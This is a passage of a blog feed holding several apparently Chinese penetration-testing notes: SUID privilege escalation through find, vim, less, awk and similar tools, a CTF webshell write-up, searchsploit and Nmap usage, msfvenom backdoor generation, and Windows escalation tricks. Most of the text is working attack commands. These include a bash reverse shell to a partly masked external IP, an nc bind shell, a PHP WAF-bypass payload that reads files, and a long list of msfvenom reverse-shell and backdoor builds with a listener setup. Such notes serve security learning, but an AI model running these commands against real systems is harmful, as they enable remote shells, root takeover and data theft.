\;</span><br><span class="line">sh-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell。广播shell的操作:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find user -<span class="built_in">exec</span> nc -lvp 4444 -e <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure><p>在攻击机上执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure><p>反弹shell的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1'</span> \;</span><br></pre></td></tr></table></figure><p>在攻击机上执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><h3 id="02-Vim"><a href="#02-Vim" class="headerlink" title="02 Vim"></a>02 Vim</h3><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny  /etc/passwd</span><br></pre></td></tr></table></figure><p>通过vim进入shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment">#vim命令</span></span><br><span class="line">:<span class="built_in">set</span> shell = <span class="string">'/bin/sh'</span></span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><h3 id="03-Bash"><a href="#03-Bash" class="headerlink" title="03 Bash"></a>03 Bash</h3><p>以下命令将以root身份打开一个bash shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure><h3 id="04-less"><a href="#04-less" class="headerlink" title="04 less"></a>04 less</h3><p>less命令也可以进入shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h3 id="05-more"><a href="#05-more" class="headerlink" title="05 more"></a>05 more</h3><p>more命令进入shell和less相同：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p>要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用<code>!</code>命令进入shell。</p><h3 id="06-nano"><a href="#06-nano" class="headerlink" title="06 nano"></a>06 nano</h3><p>nano也算是比较上古的文本编辑器了。nano进入shell的方法为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano <span class="comment">#进入nano编辑器</span></span><br><span class="line">Ctrl + R</span><br><span class="line">Ctrl + X </span><br><span class="line"><span class="comment">#即可输入命令</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/7.jpg" alt></p><h3 id="07-cp"><a href="#07-cp" class="headerlink" title="07 cp"></a>07 cp</h3><p>使用cp 命令覆盖原来的<code>/etc/passwd</code>文件</p><h3 id="08-awk"><a href="#08-awk" class="headerlink" title="08 awk"></a>08 awk</h3><p>awk命令进入shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/27/SUID%E6%8F%90%E6%9D%83/8.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SUID提权&quot;&gt;&lt;a href=&quot;#SUID提权&quot; class=&quot;headerlink&quot; title=&quot;SUID提权&quot;&gt;&lt;/a&gt;SUID提权&lt;/h1&gt;&lt;p&gt;转载自链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/27
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Write-Shell</title>
    <link href="http://bai-ren-1.github.io/2021/07/27/Write-Shell/"/>
    <id>http://bai-ren-1.github.io/2021/07/27/Write-Shell/</id>
    <published>2021-07-27T07:35:56.000Z</published>
    <updated>2021-07-27T07:41:30.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Write-Shell"><a href="#Write-Shell" class="headerlink" title="Write-Shell"></a>Write-Shell</h1><p>一道无聊的CTF题，来自红明谷CTF 2021的题目《write_shell》</p><h2 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h2><p>进入题目，直接给出了源代码，如下图所示：</p><p><img src="/2021/07/27/Write-Shell/1.png" alt></p><p>看看主函数的操作，通过action参数判断动作：如果传入值是pwd则打印当前路径，如果传入值是upload则可以再传入一个data参数，将其值经过waf函数过滤后写进指定的文件。那么很明显我们的目的就是绕过waf，通过写入代码去读取flag。</p><p><img src="/2021/07/27/Write-Shell/2.png" alt></p><p>回头看看定义的两个个函数check和waf，如何对传入的参数进行过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/&apos;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input)</span><br></pre></td></tr></table></figure><p>还是比较简单好绕的：</p><ul><li>过滤php：通过使用php短标签<?= ?> 绕过；</li><li>过滤空格：通过\t进行绕过；</li><li>使用`直接执行代码；</li><li>使用cat读取flag</li></ul><p>最终构造的payload：<?=`cat\t/*`?></p><p>构造好了payload也就进行攻击了。先传入pwd拿到路径：</p><p><img src="/2021/07/27/Write-Shell/3.png" alt></p><p>再传入upload将payload写进文件：</p><p><img src="/2021/07/27/Write-Shell/4.png" alt></p><p>结合第一步拿到的路径，访问拿到最后的flag：</p><p><img src="/2021/07/27/Write-Shell/5.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Write-Shell&quot;&gt;&lt;a href=&quot;#Write-Shell&quot; class=&quot;headerlink&quot; title=&quot;Write-Shell&quot;&gt;&lt;/a&gt;Write-Shell&lt;/h1&gt;&lt;p&gt;一道无聊的CTF题，来自红明谷CTF 2021的题目《write_s
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>GTFObins</title>
    <link href="http://bai-ren-1.github.io/2021/07/27/GTFObins/"/>
    <id>http://bai-ren-1.github.io/2021/07/27/GTFObins/</id>
    <published>2021-07-27T07:18:52.000Z</published>
    <updated>2021-07-27T07:25:13.374Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GTFObins"><a href="#GTFObins" class="headerlink" title="GTFObins"></a>GTFObins</h1><p>好东西记录一下。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>网址链接：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><p>“GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.The project collects legitimate <a href="https://gtfobins.github.io/functions/" target="_blank" rel="noopener">functions</a> of Unix binaries that can be abused to <del>get the f**k</del> break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.It is important to note that this is <strong>not</strong> a list of exploits, and the programs listed here are not vulnerable per se, rather, GTFOBins is a compendium about how to live off the land when you only have certain binaries available.GTFOBins is a <a href="https://github.com/GTFOBins/GTFOBins.github.io/graphs/contributors" target="_blank" rel="noopener">collaborative</a> project created by <a href="https://twitter.com/norbemi" target="_blank" rel="noopener">Emilio Pinna</a> and <a href="https://twitter.com/cyrus_and" target="_blank" rel="noopener">Andrea Cardaci</a> where everyone can <a href="https://gtfobins.github.io/contribute/" target="_blank" rel="noopener">contribute</a> with additional binaries and techniques.If you are looking for Windows binaries you should visit <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a>.”</p><p>直接贴谷歌翻译的概要：GTFOBins是一个精心策划的Unix二进制文件列表，可用于绕过配置错误的系统中的本地安全限制。该项目收集Unix具有合法功能的二进制文件，这些二进制文件可以被Hack，以获得受限的shell、升级或维护提升的特权、传输文件、生成绑定和反向shell。个人理解其实就是教你怎么利用合法软件提权</p><h2 id="0x01-利用"><a href="#0x01-利用" class="headerlink" title="0x01 利用"></a>0x01 利用</h2><ul><li>sudo -l 看进程</li><li>GTFObins 找对应利用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;GTFObins&quot;&gt;&lt;a href=&quot;#GTFObins&quot; class=&quot;headerlink&quot; title=&quot;GTFObins&quot;&gt;&lt;/a&gt;GTFObins&lt;/h1&gt;&lt;p&gt;好东西记录一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Searchsploit</title>
    <link href="http://bai-ren-1.github.io/2021/07/27/Searchsploit/"/>
    <id>http://bai-ren-1.github.io/2021/07/27/Searchsploit/</id>
    <published>2021-07-27T06:59:31.000Z</published>
    <updated>2021-07-27T07:06:52.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h1><p>记录好东西。</p><h2 id="0x00-Exploit-db"><a href="#0x00-Exploit-db" class="headerlink" title="0x00 Exploit-db"></a>0x00 Exploit-db</h2><p>Exploit-db是Kali linux 官方团队维护的一个安全项目，存储了大量的漏洞利用程序，是公认的世界上最大的搜集漏洞的数据库。它的在线版本是<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>  ，离线版本是：<a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a> 。</p><p>而searchsploit可以利用exploit-db提供的数据库进行离线搜索，加上参数又可以到exploit-db.com上进行在线搜索。可以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。Kali Linux或者其他的渗透测试系统默认安装了searchsploit,因此本文不再讲其安装过程。使用方法是使用终端，键入其语法。 </p><h2 id="0x01-参数"><a href="#0x01-参数" class="headerlink" title="0x01 参数"></a>0x01 参数</h2><p>-c, –case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。</p><p>-e, –exact [Term]对exploit标题执行EXACT匹配（默认为AND）</p><p>-h, –help在屏幕上显示帮助</p><p>-j, –json[Term]以JSON格式显示结果</p><p>-m, –mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号</p><p>-o, –overflow [Term]Exploit标题被允许溢出其列</p><p>-p, –path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号</p><p>-t, –title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）</p><p>-u, –update检查并安装任何exploitdb软件包更新（deb或git）</p><p>-w, –www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索）</p><p>-x, –examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用</p><p>-v –verbose 显示更多的输出信息</p><p>–colour在搜索结果中禁用颜色突出显示.</p><p>–id显示EDB-ID值而不是本地路径</p><p>–nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）</p><h2 id="0x02-实例"><a href="#0x02-实例" class="headerlink" title="0x02 实例"></a>0x02 实例</h2><ul><li>searchsploit phpcms 查找phpcms的exp</li><li>searchsploit -p 29349 查看29349编号的exp所在路径等</li><li>通过cat查看利用方式或者通过路径将exp的内容cp出来利用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Searchsploit&quot;&gt;&lt;a href=&quot;#Searchsploit&quot; class=&quot;headerlink&quot; title=&quot;Searchsploit&quot;&gt;&lt;/a&gt;Searchsploit&lt;/h1&gt;&lt;p&gt;记录好东西。&lt;/p&gt;
&lt;h2 id=&quot;0x00-Exploi
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>MSF后门生成&amp;监听命令</title>
    <link href="http://bai-ren-1.github.io/2021/07/19/MSF%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90&amp;%E7%9B%91%E5%90%AC%E5%91%BD%E4%BB%A4/"/>
    <id>http://bai-ren-1.github.io/2021/07/19/MSF%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90&amp;%E7%9B%91%E5%90%AC%E5%91%BD%E4%BB%A4/</id>
    <published>2021-07-19T03:41:14.000Z</published>
    <updated>2021-08-26T08:43:08.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSF后门生成-amp-监听命令"><a href="#MSF后门生成-amp-监听命令" class="headerlink" title="MSF后门生成&amp;监听命令"></a>MSF后门生成&amp;监听命令</h1><p>简单的记录一下。</p><h2 id="0x00-MSFVenom参数"><a href="#0x00-MSFVenom参数" class="headerlink" title="0x00 MSFVenom参数"></a>0x00 MSFVenom参数</h2><p>MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下： </p><table><thead><tr><th>MSFVenom参数说明</th></tr></thead><tbody><tr><td>e 编码方式</td></tr><tr><td>i 编码次数</td></tr><tr><td>b 在生成的程序中避免出现的值</td></tr><tr><td>f 输出格式</td></tr><tr><td>p 选择payload</td></tr><tr><td>l 查看所有payload</td></tr><tr><td>a 选择架构平台(x86|x64|x86_64)</td></tr><tr><td>o 文件输出</td></tr><tr><td>c 添加自己的shellcode</td></tr><tr><td>x|k 捆绑</td></tr></tbody></table><h2 id="0x01-后门生成"><a href="#0x01-后门生成" class="headerlink" title="0x01 后门生成"></a>0x01 后门生成</h2><p>Windows</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -e x86/shikata_ga_nai -b 'x00x0axff' -i <span class="number">3</span> -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -f elf -o payload.elf</span><br></pre></td></tr></table></figure><p>Mac</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f macho -o payload.macho</span><br></pre></td></tr></table></figure><p> powershell（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=</span><br><span class="line">Attack IP LPORT=Atack port -e <span class="built_in">cmd</span>/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><p>php（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> '&lt;?php ' | tr -d 'n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure><p>aspx（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">Attack IP LPORT=Atack port -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure><p>jsp（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -o payload.jsp</span><br></pre></td></tr></table></figure><p>war（反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -</span><br><span class="line">o payload.war</span><br></pre></td></tr></table></figure><p>nodejs（反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.js</span><br></pre></td></tr></table></figure><p>python（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -</span><br><span class="line">f raw -o payload.py</span><br></pre></td></tr></table></figure><p>perl（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_perl LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.pl</span><br></pre></td></tr></table></figure><p>ruby（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.rb</span><br></pre></td></tr></table></figure><p>lua（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_lua LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.lua</span><br></pre></td></tr></table></figure><p>windows shellcode</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">Attack IP LPORT=Atack port -f c</span><br></pre></td></tr></table></figure><p>linux shellcode</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -f c</span><br></pre></td></tr></table></figure><p>mac shellcode</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=Attack IP</span><br><span class="line">LPORT=Atack port -f c</span><br></pre></td></tr></table></figure><h2 id="0x02-监听端口"><a href="#0x02-监听端口" class="headerlink" title="0x02 监听端口"></a>0x02 监听端口</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST Attack IP</span><br><span class="line"><span class="built_in">set</span> LPORT Atack port</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><blockquote><p>如果是windows就把php换成windows，以此类推；如果payload指定的是https，就把tcp换成https，以此类推。</p></blockquote><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>无聊。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MSF后门生成-amp-监听命令&quot;&gt;&lt;a href=&quot;#MSF后门生成-amp-监听命令&quot; class=&quot;headerlink&quot; title=&quot;MSF后门生成&amp;amp;监听命令&quot;&gt;&lt;/a&gt;MSF后门生成&amp;amp;监听命令&lt;/h1&gt;&lt;p&gt;简单的记录一下。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Nmap使用</title>
    <link href="http://bai-ren-1.github.io/2021/07/16/Nmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://bai-ren-1.github.io/2021/07/16/Nmap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-07-16T05:36:35.000Z</published>
    <updated>2021-08-16T06:34:17.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h1><p>记录一下方便CV。</p><h2 id="0x00-扫描方式"><a href="#0x00-扫描方式" class="headerlink" title="0x00 扫描方式"></a>0x00 扫描方式</h2><ul><li>TCP：-sT</li><li>SYN：-sS</li><li>ACK：-sA</li><li>UDP：-sU</li><li>RPC：-sR</li><li>ICMP：-sP</li><li>Disable Port Scan：-sn</li></ul><h2 id="0x01-常用扫描"><a href="#0x01-常用扫描" class="headerlink" title="0x01 常用扫描"></a>0x01 常用扫描</h2><ul><li>扫描10000端口、操作系统、版本：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A &lt;target&gt;</span><br></pre></td></tr></table></figure><ul><li>版本探测：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV &lt;target&gt;</span><br></pre></td></tr></table></figure><ul><li>操作系统：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O &lt;target&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02-输出格式"><a href="#0x02-输出格式" class="headerlink" title="0x02 输出格式"></a>0x02 输出格式</h2><ul><li>-oN <File></File></li><li>-oX <XML file></XML></li><li>-oG <Filespec></Filespec></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nmap使用&quot;&gt;&lt;a href=&quot;#Nmap使用&quot; class=&quot;headerlink&quot; title=&quot;Nmap使用&quot;&gt;&lt;/a&gt;Nmap使用&lt;/h1&gt;&lt;p&gt;记录一下方便CV。&lt;/p&gt;
&lt;h2 id=&quot;0x00-扫描方式&quot;&gt;&lt;a href=&quot;#0x00-扫描方式&quot; 
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>提权总结</title>
    <link href="http://bai-ren-1.github.io/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://bai-ren-1.github.io/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2021-07-13T03:22:45.000Z</published>
    <updated>2021-07-13T04:14:53.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提权总结"><a href="#提权总结" class="headerlink" title="提权总结"></a>提权总结</h1><p>转载自：<a href="https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247490498&amp;idx=1&amp;sn=891507a7354e2991da33f09bce8a4346&amp;chksm=eafa538edd8dda9817273c22e8714fd1740876bbabf62ed04a0adab72522c01e3439e762e8c9&amp;scene=132#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247490498&amp;idx=1&amp;sn=891507a7354e2991da33f09bce8a4346&amp;chksm=eafa538edd8dda9817273c22e8714fd1740876bbabf62ed04a0adab72522c01e3439e762e8c9&amp;scene=132#wechat_redirect</a></p><h2 id="0x00-权限"><a href="#0x00-权限" class="headerlink" title="0x00 权限"></a>0x00 权限</h2><ul><li><strong>system账户</strong></li></ul><p>Windows系统最高级别的权限是System用户权限，有一些操作需要System权限才能完成，比如修改注册表核心键值、强制结束恶意应用程序进程等。</p><ul><li><strong>管理员账户</strong></li></ul><p>具有最高的管理和使用权限，能改变系统所有设置，可以安装和删除程序，能访问计算机上所有的文件。除此之外，它还拥有控制其他用户的权限。</p><ul><li><strong>普通用户账户</strong></li></ul><p>某些功能的使用，是受到一定限制的账户，在系统中可以创建多个此类账户，也可以改变其账户类型。该账户可以访问已经安装在计算机上的程序，可以设置自己账户的图片、密码等，但无权更改大多数计算机的设置。 </p><h2 id="0x01-Web提权"><a href="#0x01-Web提权" class="headerlink" title="0x01 Web提权"></a>0x01 Web提权</h2><ul><li><strong>上传后门文件</strong>，获取到webshell权限。 </li><li>在web权限提升中，最常用的是溢出漏洞提权，<strong>用cmd去执行文件</strong>进行提权，从下图可以清晰的看到我们在webshell看到的权限和服务器上看到的权限是不一样的。 </li></ul><p><img src="/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png" alt></p><ul><li><p>利用<strong>systeminfo进行信息收集</strong>，一般关注操作系统版本，打过的补丁编号。 </p></li><li><p>获取到补丁编号后，我们要<strong>进行补丁筛选</strong>，推荐两个优秀项目：wesng , windowsVulnScan。将上面收集到的信息保存到1.txt中，利用wesng进行补丁筛选。</p><ul><li><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">https://github.com/bitsadmin/wesng</a></li><li><a href="https://github.com/chroblert/WindowsVulnScan" target="_blank" rel="noopener">https://github.com/chroblert/WindowsVulnScan</a> </li></ul></li><li><p>执行完后会将可能存在的漏洞保存在vuln.csv中。</p></li><li><p>利用MSF或特定EXP进行提权（msf要搭建在外网，才能将会话反弹到本机，内网不能反弹）生成一个5577.exe后门，webshell执行该后门，反弹的端口号为5577。</p></li><li><p>端口反弹的权限为<strong>web权限</strong>。</p><p><img src="/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2.png" alt></p></li><li><p>利用<strong>wesng中收集到的漏洞编号，进行模块利用</strong>，并且设置反弹端口，此时的端口号应该与前面的不同，这个端口反弹的权限为提权后的权限，并且监听的会话与上面的会话对应。</p></li><li><p>成功反弹<strong>system权限</strong>。</p></li></ul><blockquote><p>其实就是上传Webshell后信息收集补丁信息，然后抄EXP去打罢了。</p></blockquote><h2 id="0x02-本地提权"><a href="#0x02-本地提权" class="headerlink" title="0x02 本地提权"></a>0x02 本地提权</h2><p>获取本地普通用户的权限后，要将权限提升为更高权限，本地提权的成功概率比web提权更高。 </p><ul><li><strong>系统溢出漏洞提权</strong> </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接网上下载BitsArbitraryFileMoveExploit.exe,运行就可以提升为系统权限；</span><br></pre></td></tr></table></figure><ul><li><strong>AT命令提权</strong> </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> <span class="number">13</span>:<span class="number">36</span> /interactive <span class="built_in">cmd</span>.exe (在<span class="number">13</span>：<span class="number">36</span>分生成一个交互式的System权限的<span class="built_in">cmd</span>)</span><br><span class="line">使用版本：Win2000 &amp; Win2003 &amp; XP</span><br></pre></td></tr></table></figure><ul><li><strong>SC命令提权</strong> </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= “<span class="built_in">cmd</span> /K <span class="built_in">start</span>” <span class="built_in">type</span>= own <span class="built_in">type</span>= interact #创建一个名叫syscmd的新的交互式的<span 